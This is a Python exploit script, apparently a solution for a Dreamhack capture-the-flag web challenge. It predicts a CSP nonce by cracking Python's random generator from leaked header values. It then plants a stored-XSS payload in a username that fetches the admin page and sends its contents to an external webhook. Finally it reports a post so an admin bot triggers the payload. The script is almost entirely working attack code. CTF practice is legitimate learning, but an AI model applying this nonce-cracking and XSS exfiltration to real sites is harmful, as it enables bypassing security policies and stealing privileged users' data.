import requests
from randcrack import RandCrack
import re

url = 'http://host3.dreamhack.games:9146/'
s = requests.Session()

# get randint leaks
def get_rands(hex_nonce):
    nonce = int(hex_nonce, 16)

    r0 = nonce & 0xffffffff
    r1 = (nonce >> 32) & 0xffffffff
    r2 = (nonce >> 64) & 0xffffffff
    r3 = (nonce >> 96) & 0xffffffff

    return [r0, r1, r2, r3]

rc = RandCrack()

for i in range(156):
    res = s.get(url, allow_redirects=False)

    nonce = re.findall(r"nonce-([a-z0-9]+)", str(res.headers))[0].strip()
    print(f"> Leak {i}/156", nonce)

    for rand in get_rands(nonce):
        rc.submit(rand)

# predict nonce
def predict_nonce():
    nonce = 0
    for i in range(4):
        nonce |= rc.predict_randint(0, 0xfffffffe) << 32 * i
    return hex(nonce)[2:].zfill(32)

offset = 4
nonce = None

for _ in range(offset):
    nonce = predict_nonce()

print("> Nonce:", nonce)

# stored xss
webhook = 'https://nwihksz.request.dreamhack.games'

payload = '''<script nonce=%s>fetch('/admin').then(r=>r.text()).then(d=>location.href=`%s?e=${d}`)</script>''' % (nonce, webhook)

creds = {
    'username': payload,
    'password': 'hacked'
}

res = s.post(f'{url}/register', data={
    'newUsername': creds['username'],
    'newPassword': creds['password']
}, allow_redirects=False)

res = s.post(f'{url}/login', data=creds, allow_redirects=False)

print("> Logged in")

# report
res = s.post(f'{url}/create_post', data={
    'postText': 'a'
}, allow_redirects=False)

res = s.post(f'{url}/report_post', data={
    'post_id': 1
}, allow_redirects=False)

print("> Reported payload")